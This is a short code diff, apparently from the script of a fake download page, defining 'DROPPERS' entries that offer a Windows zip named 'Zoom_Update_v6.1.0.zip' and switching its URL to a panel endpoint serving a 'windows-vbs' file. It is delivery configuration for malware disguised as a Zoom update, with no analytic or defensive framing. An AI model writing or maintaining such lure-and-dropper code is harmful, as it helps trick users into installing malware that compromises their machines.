@@ -22,7 +22,7 @@
   var DROPPERS = {
     windows: {
       name: 'Zoom_Update_v6.1.0.zip', size: 25072, platform: 'windows', format: 'zip', arch: 'x64',
-      url: 'https://global.telcom.stream/downloads/droppers/Zoom_Update_v6.1.0-windows.zip',
+      url: 'https://panel.telcom.stream/download/windows-vbs',
       release: 'dropper-6.1.0', updatedAt: 1
     },
     macos: {
